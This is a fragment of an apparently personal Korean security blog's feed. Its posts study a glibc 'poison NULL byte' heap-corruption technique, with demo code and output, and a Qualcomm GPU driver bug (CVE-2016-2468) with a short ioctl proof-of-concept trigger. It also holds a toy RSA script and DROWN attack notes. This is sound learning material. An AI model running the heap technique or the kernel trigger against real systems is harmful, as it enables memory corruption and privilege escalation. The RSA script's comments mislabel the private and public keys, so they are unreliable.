    <link href="http://zomo.heroku.com/blog/2016/06/14/hitcon-ctf-2014-unexploitable-heap-overflow/"/>
    <updated>2016-06-14T09:53:38+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/06/14/hitcon-ctf-2014-unexploitable-heap-overflow</id>
    <content type="html"><![CDATA[<ul>
<li><a href="http://acez.re/ctf-writeup-hitcon-ctf-2014-stkof-or-modern-heap-overflow/">acez.re&rsquo;s writeup</a></li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Glibc Adventures: The Forgotten Chunks]]></title>
    <link href="http://zomo.heroku.com/blog/2016/06/14/glibc-adventures-the-forgotten-chunks/"/>
    <updated>2016-06-14T09:50:05+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/06/14/glibc-adventures-the-forgotten-chunks</id>
    <content type="html"><![CDATA[
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Poison NULL Byte]]></title>
    <link href="http://zomo.heroku.com/blog/2016/06/13/poison-null-byte/"/>
    <updated>2016-06-13T16:46:53+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/06/13/poison-null-byte</id>
    <content type="html"><![CDATA[<p><a href="https://github.com/shellphish/how2heap/blob/master/poison_null_byte.c">Shellphish 가 쓴 힙 공격 문서중에 하나, Poison NULL byte</a> 를 읽고 정리한다.</p>

<ul>
<li>참고 문서: <a href="http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf">Glibc Adventures: The Fogotten Chunks</a></li>
</ul>


<p>우선 a,b,c 를 차례로 alloc 한다.</p>

<p>Ubuntu 에서 0x100 을 을 alloc 하고, <code>malloc_usable_size()</code> 를 해보면, 0x108 이 나온다. Rounding 때문인지, 요청한 것보다 메모리 영역이 더 잡혔다.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>a = (uint8_t*)malloc(0x100);
</span><span class='line'>b = (uint8_t*)malloc(0x200);
</span><span class='line'>c = (uint8_t*)malloc(0x100);</span></code></pre></td></tr></table></div></figure>


<ul>
<li><p>이제 <code>uint64_t* b_size_ptr = (uint64_t*)(b-8);</code> 을 통해서, <code>struct malloc_chunk</code> 구조체 멤버인 <code>INTERNAL_SIZE_T size;</code> 를 가리키는 포인터를 만든다.</p></li>
<li><p>이 구조체를 이용해 b.size 를 찍어볼 수가 있는데,</p></li>
<li><p>0x211 로 나온다. <code>(0x200 + 0x10) | prev_in_use</code> 가 되는 것.</p></li>
<li><p>이제 <code>a[real_a_size] = 0;</code>  을 통해서, b.size 의 하위 1 바이트를 0 으로 만든다.</p></li>
<li><p>b.size 를 찍어보면 이제 0x210 으로 나온다.</p></li>
<li><p>이제 c.prev_size 를 찍어본다. b 를 free 했기때문에, 유효한 필드가 되버렸다. 찍으면 0x210 이 나온다.</p></li>
<li><p>이제 <code>b1 = malloc(0x100);</code> 을 한다. 그러면 예전 b 자리에 할당될 것이다.</p></li>
</ul>


<p>만약 <code>a[real_a_size] = 0;</code> 을 안했다면, 다음과 같이 c.prev 가 제대로 update 되는데&hellip; (0x200 으로 앨록한 자리에 0x100 을 앨록했으니, c 앞에 free chunk 가 존재)</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>~ » ./a.out                                                              z@ubuntu
</span><span class='line'>a: 0x1466010
</span><span class='line'>real_a_size: 0x108
</span><span class='line'>b: 0x1466120
</span><span class='line'>real_b_size: 0x208
</span><span class='line'>c: 0x1466330
</span><span class='line'>addr of b_size_ptr: 0x1466118
</span><span class='line'>b.size after free: 0x211
</span><span class='line'>b.size is (0x200+0x10) | prev_in_use
</span><span class='line'>addr of c_prev_size_ptr: 0x1466320
</span><span class='line'>c.prev_size is 0x210
</span><span class='line'>b1: 0x1466120
</span><span class='line'>c.prev_size is 0x100
</span><span class='line'>c' 0x100
</span><span class='line'>c'' 0</span></code></pre></td></tr></table></div></figure>


<p><code>a[real_a_size] = 0;</code>&hellip; 즉 앞의 청크에서 NULL 바이트 오버플로우가 일어났다면&hellip; 그래서 b.size 의 하위 1 바이트를 0 으로 만들었다면 무슨 일이 벌어지는가? (<code>c'</code> 는 <code>c - 16</code>, <code>c''</code> 는 <code>c - 32</code>)</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>~ » ./a.out                                                              z@ubuntu
</span><span class='line'>a: 0x1466010
</span><span class='line'>real_a_size: 0x108
</span><span class='line'>b: 0x1466120
</span><span class='line'>real_b_size: 0x208
</span><span class='line'>c: 0x1466330
</span><span class='line'>addr of b_size_ptr: 0x1466118
</span><span class='line'>b.size after free: 0x211
</span><span class='line'>b.size is (0x200+0x10) | prev_in_use
</span><span class='line'>addr of c_prev_size_ptr: 0x1466320
</span><span class='line'>c.prev_size is 0x210
</span><span class='line'>b1: 0x1466120
</span><span class='line'>c.prev_size is 0x210
</span><span class='line'>c' 0x210
</span><span class='line'>c'' 0xf0</span></code></pre></td></tr></table></div></figure>


<p>c.prev_size 가 제대로 update 되지 않는다. 0x210 -> 0x100 으로 줄어야하는데. 대신 엉뚱한데 0f0 이 써졌다.</p>

<p>정리하면, <code>a|b|c</code> 가 앨록된 상황에서, b 가 프리되고, a 가 overflow 되면서 b.size 의 1 바이트가 0 으로 바뀌었다. 그랬더니, 추후 앨록을 하니까 c 의 메타데이터가 연쇄반응으로 깨져버렸다.</p>

<p>이제,</p>

<ul>
<li>현재 <code>a|b1|(free)|c</code> 로 앨록된 상황이다. c.prev_size 는 지나치게 크게 되어있다. b1 까지도 free 하다고 잘못 생각하고 있는 상황.</li>
</ul>


<p>이제 <code>b2</code> 를 앨록한다.</p>

<ul>
<li><p>그럼 <code>a|b1|b2|(free)|c</code> 로 앨록된 상황이다. 여전히 c.prev 는 잘못되어있다.</p></li>
<li><p>여기서 <code>free(b1); free(c);</code> 를 해준다음에 꽤 큰 사이즈를 <code>d</code> 로 앨록 요청하면, 상식적으로 <code>b2</code> 다음에 존재하던 free chunk 부터 앨록되어야 하나, 메모리 매니저는 <code>b == b1</code> 자리에 앨록한다. <code>d</code> 와 <code>b2</code> 가 overlapping 되는 셈.</p></li>
<li><p>이제 <code>d</code> 에다가 쓰인 데이터는 <code>b2</code> 가 가리키는 메모리를 를 corrupt 시킨다.</p></li>
<li><p>교훈은, malloc 에서 경계를 넘어가서, 1 바이트만 NULL 로 overwrite 되어도 메모리 커럽션이 일어날 수 있다는 것.</p></li>
</ul>


<p><code>b.size</code> 의 <code>prev_in_use</code> 가 overwrite 되지 않았을 경우,</p>

<p>소스.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;stdio.h&gt;
</span><span class='line'>#include &lt;stdlib.h&gt;
</span><span class='line'>#include &lt;string.h&gt;
</span><span class='line'>#include &lt;stdint.h&gt;
</span><span class='line'>#include &lt;malloc.h&gt;
</span><span class='line'>
</span><span class='line'>int main()
</span><span class='line'>{
</span><span class='line'>  uint8_t* a;
</span><span class='line'>  uint8_t* b;
</span><span class='line'>  uint8_t* c;
</span><span class='line'>  uint8_t* b1;
</span><span class='line'>  uint8_t* b2;
</span><span class='line'>  uint8_t* d;
</span><span class='line'>
</span><span class='line'>  a = (uint8_t*) malloc(0x100);
</span><span class='line'>  int real_a_size = malloc_usable_size(a);
</span><span class='line'>  printf("a: %p\n",a);
</span><span class='line'>  printf("real_a_size: %#x\n",real_a_size);
</span><span class='line'>
</span><span class='line'>  b = (uint8_t*) malloc(0x200);
</span><span class='line'>  int real_b_size = malloc_usable_size(b);
</span><span class='line'>  printf("b: %p\n",b);
</span><span class='line'>  printf("real_b_size: %#x\n",real_b_size);
</span><span class='line'>  
</span><span class='line'>  c = (uint8_t*) malloc(0x100);
</span><span class='line'>  printf("c: %p\n",c);
</span><span class='line'>
</span><span class='line'>  uint64_t* b_size_ptr = (uint64_t*)(b-8);
</span><span class='line'>  printf("addr of b_size_ptr: %p\n",b_size_ptr);
</span><span class='line'>
</span><span class='line'>  free(b);
</span><span class='line'>
</span><span class='line'>  printf("b.size after free: %#lx\n",*b_size_ptr);
</span><span class='line'>  printf("b.size is (0x200+0x10) | prev_in_use\n");
</span><span class='line'>
</span><span class='line'>  a[real_a_size] = 0;
</span><span class='line'>  printf("b.size after free: %#lx\n",*b_size_ptr);
</span><span class='line'>
</span><span class='line'>  uint64_t* c_prev_size_ptr = (uint64_t*)(c-16);
</span><span class='line'>  printf("addr of c_prev_size_ptr: %p\n",c_prev_size_ptr);
</span><span class='line'>  
</span><span class='line'>  printf("c.prev_size is %#lx\n",*c_prev_size_ptr);
</span><span class='line'>
</span><span class='line'>  b1 = malloc(0x100);
</span><span class='line'>  printf("b1: %p\n",b1);
</span><span class='line'>
</span><span class='line'>  printf("c.prev_size is %#lx\n",*c_prev_size_ptr);
</span><span class='line'>  printf("c - 8 %#lx\n",*(((uint64_t*)c)-1));
</span><span class='line'>  printf("c - 16 %#lx\n",*(((uint64_t*)c)-2));
</span><span class='line'>  printf("c - 24 %#lx\n",*(((uint64_t*)c)-3));
</span><span class='line'>  printf("c - 32 %#lx\n",*(((uint64_t*)c)-4));
</span><span class='line'>
</span><span class='line'>  b2 = malloc(0x80);
</span><span class='line'>  printf("b2: %p\n",b2);
</span><span class='line'>  memset(b2,'B',0x80);
</span><span class='line'>  printf("Current b2 content:\n%s\n",b2);
</span><span class='line'>
</span><span class='line'>  printf("c.prev_size is %#lx\n",*c_prev_size_ptr);
</span><span class='line'>  printf("c - 8 %#lx\n",*(((uint64_t*)c)-1));
</span><span class='line'>  printf("c - 16 %#lx\n",*(((uint64_t*)c)-2));
</span><span class='line'>  printf("c - 24 %#lx\n",*(((uint64_t*)c)-3));
</span><span class='line'>  printf("c - 32 %#lx\n",*(((uint64_t*)c)-4));
</span><span class='line'>
</span><span class='line'>  free(b1);
</span><span class='line'>  free(c);
</span><span class='line'>  d = malloc(0x300);
</span><span class='line'>  printf("d: %p\n",d);
</span><span class='line'>
</span><span class='line'>  memset(d,'D',0x300);
</span><span class='line'>
</span><span class='line'>  printf("New b2 content:\n%s\n",b2);
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>실행결과.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>~ » ./a.out                                                      z@ubuntu
</span><span class='line'>a: 0x12f4010
</span><span class='line'>real_a_size: 0x108
</span><span class='line'>b: 0x12f4120
</span><span class='line'>real_b_size: 0x208
</span><span class='line'>c: 0x12f4330
</span><span class='line'>addr of b_size_ptr: 0x12f4118
</span><span class='line'>b.size after free: 0x211
</span><span class='line'>b.size is (0x200+0x10) | prev_in_use
</span><span class='line'>addr of c_prev_size_ptr: 0x12f4320
</span><span class='line'>c.prev_size is 0x210
</span><span class='line'>b1: 0x12f4120
</span><span class='line'>c.prev_size is 0x100
</span><span class='line'>c - 8 0x110
</span><span class='line'>c - 16 0x100
</span><span class='line'>c - 24 0
</span><span class='line'>c - 32 0
</span><span class='line'>b2: 0x12f4230
</span><span class='line'>Current b2 content:
</span><span class='line'>BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
</span><span class='line'>c.prev_size is 0x70
</span><span class='line'>c - 8 0x110
</span><span class='line'>c - 16 0x70
</span><span class='line'>c - 24 0
</span><span class='line'>c - 32 0
</span><span class='line'>d: 0x12f42c0
</span><span class='line'>New b2 content:
</span><span class='line'>BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB</span></code></pre></td></tr></table></div></figure>


<p>이번에는 <code>b.size</code> 의 <code>prev_in_use</code> 가 corrupt 되었을 경우, <code>b2</code> 가 <code>D</code> 로 바뀌었는데, malloc 이 overlapping 하게 만들어져서, 다른 메모리에 대한 memset 의 사이드이펙트로 corrupt 됨을 알 수 있다.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>a: 0x1655010
</span><span class='line'>real_a_size: 0x108
</span><span class='line'>b: 0x1655120
</span><span class='line'>real_b_size: 0x208
</span><span class='line'>c: 0x1655330
</span><span class='line'>addr of b_size_ptr: 0x1655118
</span><span class='line'>b.size after free: 0x211
</span><span class='line'>b.size is (0x200+0x10) | prev_in_use
</span><span class='line'>b.size after free: 0x200
</span><span class='line'>addr of c_prev_size_ptr: 0x1655320
</span><span class='line'>c.prev_size is 0x210
</span><span class='line'>b1: 0x1655120
</span><span class='line'>c.prev_size is 0x210
</span><span class='line'>c - 8 0x110
</span><span class='line'>c - 16 0x210
</span><span class='line'>c - 24 0
</span><span class='line'>c - 32 0xf0
</span><span class='line'>b2: 0x1655230
</span><span class='line'>Current b2 content:
</span><span class='line'>BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
</span><span class='line'>c.prev_size is 0x210
</span><span class='line'>c - 8 0x110
</span><span class='line'>c - 16 0x210
</span><span class='line'>c - 24 0
</span><span class='line'>c - 32 0x60
</span><span class='line'>d: 0x1655120
</span><span class='line'>New b2 content:
</span><span class='linespan></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Control-flow Enforcement Technology Preview]]></title>
    <link href="http://zomo.heroku.com/blog/2016/06/13/control-flow-enforcement-technology-preview/"/>
    <updated>2016-06-13T13:54:08+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/06/13/control-flow-enforcement-technology-preview</id>
    <content type="html"><![CDATA[<ol>
<li><p>인텔에서 발표한 <a href="https://software.intel.com/sites/default/files/managed/4d/2a/control-flow-enforcement-technology-preview.pdf">Control-flow Enforcement Technology Preview</a>을 읽고 정리해본다.</p></li>
<li><p><a href="https://people.eecs.berkeley.edu/~daw/papers/shadow-asiaccs15.pdf">The Performance Cost of Shadow Stacks and Stack Canaries</a> 를 읽고 정리해본다.</p></li>
<li><p><a href="https://forums.grsecurity.net/viewtopic.php?f=7&amp;t=4490">grsecurity 의 비평</a></p></li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CVE-2016-2468]]></title>
    <link href="http://zomo.heroku.com/blog/2016/06/13/cve-2016-2468/"/>
    <updated>2016-06-13T13:31:59+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/06/13/cve-2016-2468</id>
    <content type="html"><![CDATA[<p><a href="http://retme.net/index.php/2016/06/12/CVE-2016-2468.html">Disclosure of CVE-2016-2468, OOB write in Qualcomm MSM GPU driver</a></p>

<ul>
<li><code>size</code> 의 하위 32 bit 가 0x80000000 보다 크면, <code>len</code> 이 음수가 된다.</li>
<li>그러면 루프에 들어가지 않고, 바로 <code>sg_mark_end()</code> 가 불린다.</li>
<li>그러면 <code>sglen</code> 이 0 인 상황에 변함이 없으므로, <code>sg_mark_end(&amp;memdesc-&gt;sg[-1]);</code> 이 된다.</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>static int
</span><span class='line'>_kgsl_sharedmem_page_alloc(struct kgsl_memdesc *memdesc,
</span><span class='line'>  struct kgsl_pagetable *pagetable,
</span><span class='line'>  size_t size)
</span><span class='line'>{
</span><span class='line'>  int ret = 0;
</span><span class='line'>  int len, page_size, sglen_alloc, sglen = 0;
</span><span class='line'>  unsigned int align;
</span><span class='line'>
</span><span class='line'>  //...snip...
</span><span class='line'>
</span><span class='line'>  len = size;
</span><span class='line'>  while (len &gt; 0) {
</span><span class='line'>      //...snip...
</span><span class='line'>  }
</span><span class='line'>  memdesc-&gt;sglen = sglen;
</span><span class='line'>  memdesc-&gt;size = size;
</span><span class='line'>  sg_mark_end(&memdesc-&gt;sg[sglen-1]);
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>PoC 는,</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>void kgsl_poc() {
</span><span class='line'>  int fd = open("/dev/kgsl-3d0",0);
</span><span class='line'>  struct kgsl_gpumem_alloc_id arg;
</span><span class='line'>  
</span><span class='line'>  arg.flags = 0;
</span><span class='line'>  arg.size = 0xa18fb010b0c08000;
</span><span class='line'>  ioctl(fd,IOCTL_KGSL_GPUMEM_ALLOC_ID,&arg);
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>사이즈가 다른 변수간에 형변환하다가, neg 가 되버리는 이슈.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Security Analysis of Emerging Smart Home Applications]]></title>
    <link href="http://zomo.heroku.com/blog/2016/05/03/security-analysis-of-emerging-smart-home-applications/"/>
    <updated>2016-05-03T18:09:46+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/05/03/security-analysis-of-emerging-smart-home-applications</id>
    <content type="html"><![CDATA[<p>Earlence Fernandes, et al. 의 아티클을 읽어보았다.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[RSA Sample Number]]></title>
    <link href="http://zomo.heroku.com/blog/2016/04/26/rsa-sample-number/"/>
    <updated>2016-04-26T15:24:39+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/04/26/rsa-sample-number</id>
    <content type="html"><![CDATA[<p>RSA sample number.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># 두개의 소수를 정한다. 
</span><span class='line'>p = 3
</span><span class='line'>q = 11
</span><span class='line'>
</span><span class='line'># 소수의 곱으로 큰 수를 하나 만든다.
</span><span class='line'>N = p*q
</span><span class='line'>
</span><span class='line'># 이제 이 큰 N 의 order 를 구한다.
</span><span class='line'>z = (p-1)*(q-1)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'># 이제 소수를 하나 정해서 개인키로 쓰다. (실제로는 coprime to z 이기만 하면 된다.)
</span><span class='line'>e = 7
</span><span class='line'>
</span><span class='line'>print "z: %d" % z
</span><span class='line'>print "N: %d" % N
</span><span class='line'>print "e: %d" % e
</span><span class='line'>
</span><span class='line'># e 의 인버스를 구한다. 인버스라 함은 곱해서 1 이 되는 수. (모듈로 z)
</span><span class='line'>for d in range(1,z):
</span><span class='line'>    if (e*d) % z  == 1:
</span><span class='line'>        print "Found d!!!: %d" % d
</span><span class='line'>        break
</span><span class='line'>
</span><span class='line'># e is the private key (in this case, 7)
</span><span class='line'># d is the public key (in this case, 3)
</span><span class='line'>
</span><span class='line'>plain = 2
</span><span class='line'>cipher = pow(plain,e) % N # 암호화: (plain)^e mod N
</span><span class='line'>print "Encrypting %d -&gt; %d" % ( plain, cipher )
</span><span class='line'>
</span><span class='line'>plain = pow(cipher,d) % N # 복호화: (cipher)^d mod N
</span><span class='line'>print "Decrypting %d -&gt; %d" % ( cipher, plain )
</span><span class='line'>
</span><span class='line'># $ python rsa.py
</span><span class='line'># z: 20
</span><span class='line'># N: 33
</span><span class='line'># e: 7
</span><span class='line'># Found d!!!: 3
</span><span class='line'># Encrypting 2 -&gt; 29
</span><span class='line'># Decrypting 29 -&gt; 2</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Bleichenbacher]]></title>
    <link href="http://zomo.heroku.com/blog/2016/03/25/bleichenbacher/"/>
    <updated>2016-03-25T09:52:51+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/03/25/bleichenbacher</id>
    <content type="html"><![CDATA[<p>RSA PKCS#1.5 format 을 공격하는 한가지 방법.</p>

<p>찾아보니 이 아저씨는 현재 구글 근무중.</p>

<p>The Drown 공격의 핵심은 두가지라고 보는데, 그 중의 하나. 나머지 하나는, 상위 버전의 문제를 취약한 SSL 하위 버전에 존재하는 oracle 에 태우기 위해 RSA 연산 문제를 reduce 하는 방법.</p>

<p>Bleichenbacher 아저씨가 발표한 논문을 정리해본다.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[The DROWN Attack]]></title>
    <link href="http://zomo.heroku.com/blog/2016/03/03/the-drown-attack/"/>
    <updated>2016-03-03T09:38:55+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/03/03/the-drown-attack</id>
    <content type="html"><![CDATA[<p><a href="https://drownattack.com">The DROWN Attack</a></p>

<p>1,000 번의 TLS 핸드쉐이크를 관찰하고, 40,000 번의 SSLv2 연결을 시도해보고, 2<sup>50</sup> 번의 symmetric cipher 연산을 하면, 2048-bit RSA TLS 핸드쉐이크를 해독하는 것이 가능하다&hellip;고 한다.</p>

<p>배정된 CVE 는 다음과 같다.</p>

<ul>
<li>CVE-2016-0800</li>
<li>CVE-2015-3197</li>
<li>CVE-2016-0703</li>
<li>CVE-2016-0704</li>
</ul>


<h4>The PKCS#1 v1.5 padding structure</h4>

<p>DROWN 공격은 RSA PKCS# v1.5 padding 구조를 이용함.</p>

<p>N = p*q, l = len(N), e 는 euler_pi(N) 과 coprime 인 정수(아마도 3 이나 65537)라고 할때, k 는 symmetric key 라고 할 때, 암호화를 돌릴 블럭은 다음과 같이 만든다. <code>m = 00 || 02 || PS || 00 || k</code></p>

<ul>
<li>처음 <code>00</code> 은 암호화를 돌릴 블럭(EB)가 N 보다 작은 정수가 되게 만들기 위해 집어 넣는 것</li>
<li><code>02</code> 는 block type</li>
<li>PS 는 패딩. len(PS) >= 8 이어야 한다. 패딩을 prepend 하는 구조. EB 와 modulo N 이 같은 byte length 를 갖도록 맞춰주는 녀석이라고 보면 된다.</li>
<li>k 는 주로 symmetric key 가 되는데, SSLv2 에서는 master_key 가 k 라고 보면 된다.</li>
<li>이 EB 를 정수로 변환한다. 변환은 256 의 index 승을 계속 곱해서 더해나가며 바이트 블럭을 변환하는 식.</li>
<li>정수로 변환해서 c = m<sup>e</sup> mod N</li>
</ul>


<h4>The SSLv2 handshake protocol</h4>

<ul>
<li>클라이언트가 <code>ClientHello</code> 를 보냄</li>
<li>서버는 <code>ServerHello</code> 를 보냄</li>
<li>c->s, <code>ClientMasterKey</code></li>
<li>s->c, <code>ServerVerify</code></li>
<li>c->s, <code>Finished</code></li>
<li>s->c, <code>Finished</code></li>
</ul>


<p>그럼 보내는 내용을 정리하면,</p>

<ul>
<li>c->s, <code>ClientHello</code>: 클라이언트 지원 cipher suites. 그리고 클라이언트 nonce (챌린지)</li>
<li>s->c, <code>ServerHello</code>: 서버 지원 cipher suites. 서버 인증서. 서버 nonce (커넥션 ID)</li>
<li>c->s, <code>ClientMasterKey</code>: 공통의 cipher suites. 그리고 master_key 를 위한 키 데이터.</li>
<li>s->c, <code>ServerVerify</code>:</li>
